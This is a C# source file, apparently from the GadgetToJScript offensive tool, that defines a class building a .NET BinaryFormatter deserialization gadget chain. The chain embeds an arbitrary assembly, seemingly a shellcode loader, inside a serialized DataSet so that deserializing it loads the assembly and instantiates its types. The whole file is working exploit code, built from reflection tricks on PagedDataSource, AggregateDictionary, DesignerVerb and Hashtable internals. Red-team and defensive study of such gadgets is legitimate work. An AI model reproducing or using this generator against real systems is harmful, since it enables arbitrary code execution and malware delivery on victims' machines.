using System;
using System.IO;
using System.Data;
using System.Linq;
using System.Reflection;
using System.Collections;
using System.Web.UI.WebControls;
using System.Collections.Generic;
using System.ComponentModel.Design;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;

namespace GadgetToJScript
{
    [Serializable]
    public class ASurrogateGadgetGenerator: ISerializable
    {
        protected byte[] assemblyBytes;

        public ASurrogateGadgetGenerator(Assembly _SHLoaderAssembly) {
            this.assemblyBytes = File.ReadAllBytes(_SHLoaderAssembly.Location);
        }

        protected ASurrogateGadgetGenerator(SerializationInfo info, StreamingContext context) { }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            try
            {
                List<byte[]> data = new List<byte[]>
                {
                    this.assemblyBytes
                };

                var e1 = data.Select(Assembly.Load);
                Func<Assembly, IEnumerable<Type>> map_type = (Func<Assembly, IEnumerable<Type>>)Delegate.CreateDelegate(typeof(Func<Assembly, IEnumerable<Type>>), typeof(Assembly).GetMethod("GetTypes"));
                var e2 = e1.SelectMany(map_type);
                var e3 = e2.Select(Activator.CreateInstance);

                PagedDataSource pds = new PagedDataSource() { DataSource = e3 };

                IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType("System.Runtime.Remoting.Channels.AggregateDictionary"), pds);

                DesignerVerb verb = new DesignerVerb("000", null);
                typeof(MenuCommand).GetField("properties", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict);

                List<object> ls = new List<object>
                {
                    e1,
                    e2,
                    e3,
                    pds,
                    verb,
                    dict
                };

                Hashtable ht = new Hashtable
                {
                    { verb, "v1" },
                    { "p2", "v2" }
                };

                FieldInfo fi_keys = ht.GetType().GetField("buckets", BindingFlags.NonPublic | BindingFlags.Instance);
                Array keys = (Array)fi_keys.GetValue(ht);
                FieldInfo fi_key = keys.GetType().GetElementType().GetField("key", BindingFlags.Public | BindingFlags.Instance);

                for (int i = 0; i < keys.Length; ++i)
                {
                    object bucket = keys.GetValue(i);
                    object key = fi_key.GetValue(bucket);
                    if (key is string)
                    {
                        fi_key.SetValue(bucket, verb);
                        keys.SetValue(bucket, i);
                        break;
                    }
                }

                fi_keys.SetValue(ht, keys);

                ls.Add(ht);

                info.SetType(typeof(DataSet));
                info.AddValue("DataSet.RemotingFormat", SerializationFormat.Binary);
                info.AddValue("DataSet.DataSetName", "");
                info.AddValue("DataSet.Namespace", "");
                info.AddValue("DataSet.Prefix", "");
                info.AddValue("DataSet.CaseSensitive", false);
                info.AddValue("DataSet.LocaleLCID", 0x409);
                info.AddValue("DataSet.EnforceConstraints", false);
                info.AddValue("DataSet.ExtendedProperties", (PropertyCollection)null);
                info.AddValue("DataSet.Tables.Count", 1);
                BinaryFormatter fmt = new BinaryFormatter();
                MemoryStream stm = new MemoryStream();
                fmt.SurrogateSelector = new SurrogateSelector();
                fmt.Serialize(stm, ls);
                info.AddValue("DataSet.Tables_0", stm.ToArray());

            }
            catch (Exception ex)
            {
                Console.Error.WriteLine(ex.Message);
            }
        }
    }
}